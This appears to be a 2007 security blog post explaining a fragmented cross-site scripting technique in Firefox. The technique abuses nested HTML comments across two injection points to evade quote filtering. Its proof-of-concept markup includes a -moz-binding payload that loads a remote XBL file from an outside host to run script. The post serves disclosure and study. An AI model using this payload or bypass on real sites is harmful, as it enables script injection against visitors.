---
archive: https://wayback.archive-it.org/22123/20231101171300/https://eve.gd/2007/06/13/firefox-nested-comment-fragmented-xss
categories:
- Information Security
comments: []
date: 2007-06-13 13:29:53 +0200
date_gmt: 2007-06-13 13:29:53 +0200
doi: https://doi.org/10.59348/3489e-gnp37
roguescholar: https://rogue-scholar.org/records/9wjrs-v0y05
atproto: at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mnfvq732n
image:
  feature: geek.png
layout: post
ogImage: images/geek.png
published: true
status: publish
tags:
- information security
- XSS
title: Firefox nested comment fragmented XSS
wordpress_id: 273
wordpress_url: http://pro.grammatic.org/post-firefox-nested-comment-fragmented-xss-26.aspx
atUri: "at://did:plc:hnpt7ns2lecdujegbi6qkqqm/site.standard.document/3mq7mnfvq732n"
kcworks: https://works.hcommons.org/records/zc3d1-k3e49
---

<p>Following on from a post on <a href="http://sla.ckers.org/forum/read.php?3,12323">sla.ckers</a> it emerges that Firefox has a vulnerability/bug that is very difficult to filter against and allows a fragmented XSS attack.</p>
<p>This is best illustrated by the following example:</p>

{% highlight html %}
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title>test</title>
	</head>
	<body>
		<!-- This is the first injection point: -- -->
		<a href="This is the second injection point: --evadefilter>
		<b style=-moz-binding:url('http://www.md5-db.com/STXSS_XBL.xml#loader') />
		<a href=test ">link</a>
	</body>
	</html>
{% endhighlight %}

<p>The conditions for the XSS working are 2 injection points. Injection point 1 must be inside an HTML comment whilst injection point 2 is inside a double quoted attributed. Here is the above markup replaced to illustrate this:</p>

{% highlight html %}
<!-- This is the first injection point: HERE -->
<a href="This is the second injection point: HERE">
{% endhighlight %}

<p>If the first injection point is given as "--" (no quotes) then a nested comment is begun. Injection point 2 should contain --> or --ANYTHING> (which is rendered as a valid comment closing tag in Firefox) to close the comment. At this point the input is being written directly into the document rather than inside the attribute - and all without using the " character which is likely to be filtered.</p>
<p>Thanks to tx and thornmaker at sla.ckers for work on this!</p>